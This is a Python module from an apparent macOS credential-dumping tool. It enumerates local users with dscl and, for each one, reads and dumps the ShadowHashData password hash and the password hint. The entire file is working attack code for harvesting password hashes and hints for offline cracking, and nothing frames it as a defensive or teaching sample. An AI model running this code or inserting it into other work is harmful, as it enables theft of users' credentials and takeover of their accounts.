import subprocess

from macdump.log import status
from macdump.shared import dump


def dump_system_hashes():
    for user in list_system_users():
        status(f"Dumping hash of {user}")

        authentication_hint = get_authentication_hint_for(user)
        if authentication_hint:
            status(f"Authentication hint: {authentication_hint}")

        shadow_hash_data = get_shadow_hash_data_for(user)
        if shadow_hash_data:
            dump(user, shadow_hash_data)


def list_system_users():
    cmd = ["dscl", ".", "list", "/Users"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0 and stdout:
        return [
            user
            for user in stdout.decode().split("\n")
            if user
            and not user.startswith("_")
            and user not in ["daemon", "nobody", "root"]
        ]
    else:
        print(f" $ {' '.join(cmd)} \n{stderr.decode()}")
        return []


def get_shadow_hash_data_for(user):
    cmd = ["dscl", ".", "-read", f"/Users/{user}", "dsAttrTypeNative:ShadowHashData"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0 and stdout:
        return stdout.decode().split("\n")[1]
    else:
        print(f" $ {' '.join(cmd)} \n{stderr.decode()}")
        return ""


def get_authentication_hint_for(user):
    cmd = ["dscl", ".", "-read", f"/Users/{user}", "AuthenticationHint"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0 and stdout:
        return stdout.decode().split("\n")[1]
    else:
        if stderr.decode().strip() != "No such key: AuthenticationHint":
            print(f" $ {' '.join(cmd)} \n{stderr.decode()}")
        return ""
